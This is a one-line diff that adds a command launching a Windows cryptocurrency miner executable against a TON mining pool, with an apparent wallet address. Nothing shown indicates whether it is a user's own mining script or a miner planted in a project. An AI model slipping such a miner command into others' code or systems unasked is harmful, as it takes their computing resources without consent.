@@ -1,0 +1,1 @@
+miner-windows.exe https://next.ton-pool.club UQDi_N9mubvHLyJUT_vIwsyvrBBjH4c5tpPIiJuiEjZlY2h6
